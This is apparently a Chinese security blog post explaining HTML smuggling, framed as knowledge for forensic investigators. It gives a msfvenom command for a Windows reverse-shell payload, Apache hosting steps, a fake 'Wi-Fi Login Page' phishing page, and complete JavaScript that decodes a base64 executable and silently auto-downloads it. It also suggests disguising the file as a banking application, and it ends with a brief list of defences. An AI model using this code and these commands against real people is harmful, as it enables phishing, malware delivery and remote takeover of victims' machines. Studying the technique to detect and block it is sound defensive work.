    2021年时，一种新的攻击手法出现了：HTML smuggling（Html挟带）。这种隐匿手法，躲过了安全产品防堵从而被黑客使用。结合相关资料，我们对它进行了研究，发现确实是挺巧妙的，利用合法规则进行了突破。作为取证安全人员，我们在工作中要对这种手法加以知晓。

![](../Images/de2aa5afdba92ad0967fdcfca32a99c5.png)

  

HTML挟带手法是使用HTML5或JavaScript的合法功能，并且在网络防火墙后合成恶意文件，而非从外部域名下载恶意执行文件，因此能躲过一般边界的安全产品，因这些安全产品只根据特征和规则检查可疑附件（如EXE、ZIP和DOCX）或流量，使其成为高度隐匿的攻击手法。

  

![](../Images/a95f2faf3a7f5d653e762d7183895275.png)  

  

    我们演示了执行HTML挟带的方法，以及提供了两个自动化脚本。

  

  

### 一、锚标记，JavaScript Blob

**锚：**锚标签 <a> 定义了一个超链接，可用于将一个页面链接到另一个资源，可用于提供可下载文件的链接。

  

**JavaScript Blob：** JavaScript Blob 是包含存储在文件中的数据的字节集合的对象。Blob 数据存储在用户的内存中。这个字节集合可以在使用实际文件的地方使用。换句话说，blob可用于在客户端上构造类似文件的对象，这些对象可以传递给需要URL 的 JavaScript API。例如，托管在服务器上的文件“payload.exe”使用 <a download> 标签下载到系统中，同样，文件payload.exe的字节可以作为JS代码的输入提供为JS blob，可以在用户端编译下载。Slice()可用于划分较大的有效负载并在代码中提供。

  

### 二、HTML 挟带攻击

在HTML5中，如果我们希望用户下载托管在我们服务器上的文件，我们可以使用锚标记来实现。

<a href=”/payload.exe” download=”payload.exe”\>Download Here</a\>

  

首先使用msfvenom创建一个有效负载到apache webroot目录中。

msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=192.168.40.158 LPORT=1234 -f exe > payload.exe

cp payload.exe /var/www/html

![](../Images/c9e8fdf81cec3f2ee613feb1c1adeef3.png)

  

现在，我们创建一个包含下载标签的简单index-demo.html文件。实时，您将使用看起来真实的网络钓鱼页面。

  

<html>

<body>

<h1>Wi-Fi Login Page!</h1>

<p>Alert! We detected some unusual activity, Login to continue. </p>

<a href="/payload.exe" download="payload.exe">Login Here</a>

</body>

</html>

然后我们将它复制到apache webroot并启动apache服务器：

cp index.html /var/www/html

cd /var/www/html

service apache2 start

![](../Images/4baa12da8cc27871f6785d7b11718360.png)

  

一旦受害者访问我们的网站并点击下载，payload就会被下载。

![](../Images/07e20872efbb104e168cdcd7ca3b9c3d.png)

当它运行时，我们会看到一个反向 shell。如果使用 JavaScript，我们能够让用户在访问网站时立即下载文件。这是我们将使用 JS Blob 的地方。

  

首先，我们需要创建一个payload，我们称之为payload.exe。然后我们需要在 Base64 中对其进行编码，因为二进制文件不能直接复制为缓冲区，因为它包含可能破坏缓冲区的各种字符，并且可能无法以这种方式复制完整文件。

  

使用Kali的 base64 实用程序来完成，

cat payload.exe | base64

![](../Images/0fad1295c6d395fab0bb5592496e54dc.png)

  

但是这个base64编码的二进制文件仍然存在问题。我们需要一个没有输入的字符串，可以通过访问base64.guru网站。

  

在这里，上传负载转换后的base64应在一行中给出。

![](../Images/e8e1a8773b3c08a4bc233160d9ee8021.png)

  

现在，我们将创建一个JavaScript Blob和一个脚本，允许我们作为攻击者在受害者端将我们的代码重新编译为EXE文件。这种方法可以绕过许多内容过滤器和防火墙，因为数据以字符串文本的形式传输。

  

代码解释如下：

函数 b64toarray：我们的 base64 编码二进制文件并将其转换为缓冲区数组，因为“Blog()”函数将缓冲区数组的输入作为第一个参数。

变量二进制：该变量包含我们二进制的base64字符串，用于提供函数b64toarray输入。

变量 blob：保存我们刚刚创建的 blob，并接受两个输入。在这里，由于我们提供二进制作为输入，MIME 类型变为八位字节/流

变量payloadfilename：它是我们的二进制文件下载到受害者机器后的名称。

CreateElement：一个 DOM 函数，可以在 JavaScript 的帮助下创建新的 HTML 元素。例如，要在 HTML 中创建一个新段落，我们键入：<p>New Para</p>

同样可以在 JS 中使用 createElement 来实现，例如：

var para = document.createElement("p");

para.innerText = "New Para";

  

在这里，我们创建了一个锚标记并使用了appendChild()函数，该函数可用于在这个新创建的元素中插入数据。例如，

<a href=”/” download=”/”>

本例中，href和download是a的子标签。所以在JS中这将是：

var a = document.createElement('a');

document.body.appendChild(a);

a.href = ‘/’;

a.download = ‘/’;

*   样式：我们使用样式“display：none”更加谨慎，以便标签在输出中不可见。
    
*   createObjectURL()：一个 DOM 函数，它可以返回一个 DOMString，其中包含一个表示对象 URL 的值。这个对象可以是文件、媒体源或者在我们的例子中是 blob。这是非常必要的，因为 a.download 仅适用于有效的 URL。为了将我们的有效负载 blob 下载到受害者上，我们需要为 a.download 元素提供此函数返回的有效 URL。
    
*   click()：是什么会触发这个锚标签自动运行。它模拟用户实际上点击了 href 标记提供的链接。

function b64toarray(base64) {

        var bin\_string = window.atob(base64);

        var len = bin\_string.length;  

        var bytes = new Uint8Array( len );

        for (var i = 0; i < len; i++)

        {

                bytes\[i\] = bin\_string.charCodeAt(i);

        }

        return bytes.buffer;

}

var binary ='<value>'

  

var data = b64toarray(binary);

var blob = new Blob(\[data\], {type: 'octet/stream'});

var payloadfilename = 'payload.exe';

  

var a = document.createElement('a');

document.body.appendChild(a);

a.style = 'display: none';

var url = window.URL.createObjectURL(blob);

a.href = url;

a.download = payloadfilename;

a.click();

window.URL.revokeObjectURL(url);

互联网上充斥着许多演示HTML挟带的模板。我们可以下载其中任何一个并修改有效负载的二进制字符串和名称，无需编码。一个这样的模板可以在以下这里找到，将其下载为 index.html

现在，我们可以用我们之前生成的 base64 字符串替换二进制文件，并将有效负载名称保留为我们喜欢的任何名称，比如 HSBCInternetBanking.exe。

  

注意： HTML挟带代码可以潜入任何合法的网络钓鱼页面，以增加其被用户执行的机会。您还可以使用高级方法，例如带有恶意宏、快捷方式文件或恶意pdf的MS Office 文档。

五、防范

建议使用以下方法防止 HTML Smuggling 攻击：

*   配置安全产品以阻止使用 JS 或 VBScript 的页面自动运行下载的可执行文件
    
*   白名单可执行文件名
    
*   将 .js 和 .jse 设置为默认使用记事本而不是浏览器打开
    
*   Aware 用户必须手动查看电子邮件附件
    
*   为解码 base64 代码或混淆 JS 脚本的 HTML 页面设置行为规则。
    

  

### 六、结论

    这篇文章介绍了一种称为 HTML Smuggling的防御规避方法，该方法会在受害者加载网站后自动将有效负载投放到受害者的系统上。这是通过使用JS blob来实现的，该blob允许将有效负载编码为HTML页面中的缓冲区字符串（通常已编码），使其仅保留在代码的内存中，然后将其解码并作为可执行文件下载到受害者的系统上. 这有助于防止组织架构中出现多个内容过滤器，这些过滤器可以防止来自例如电子邮件的EXE附件，但允许JS在没有行为检测的情况下运行。
